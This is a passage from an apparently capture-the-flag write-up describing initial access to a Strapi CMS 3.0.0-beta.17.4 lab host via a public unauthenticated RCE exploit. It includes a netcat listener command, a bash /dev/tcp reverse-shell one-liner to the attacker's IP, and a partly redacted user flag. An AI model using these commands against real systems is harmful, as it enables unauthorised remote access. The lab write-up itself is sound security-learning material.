## Initial Access
As we look for public exploits regarding Strapi CMS with version 3.0.0-beta.17.4

We find an interesting exploit that gives you the ability to change someone's passwordwhile unauthenticated.
https://www.exploit-db.com/exploits/50239
```
# Exploit Title: Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)
# Date: 2021-08-30
# Exploit Author: Musyoka Ian
# Vendor Homepage: https://strapi.io/
# Software Link: https://strapi.io/
# Version: Strapi CMS version 3.0.0-beta.17.4 or lower
# Tested on: Ubuntu 20.04
# CVE : CVE-2019-18818, CVE-2019-19609

```


After executing this script we get a blind RCE shell

We start listening on our with Netcat in our attacking machine.
nc -nlvp 1773
----------


On the Blind RCE shell we execute this command:

bash -c '/bin/bash -i >& /dev/tcp/10.10.16.247/1773 0>&1'

to give ourselves a functional shell.

As we get recieve a connection, we are logged on as user "Strapi"
$ id
uid=1001(strapi) gid=1001(strapi) groups=1001(strapi)

We can read user flag as strapi.
```
000cac322835<REDACTED>f5bfb3d2af2

```

Next is Lateral Movement.
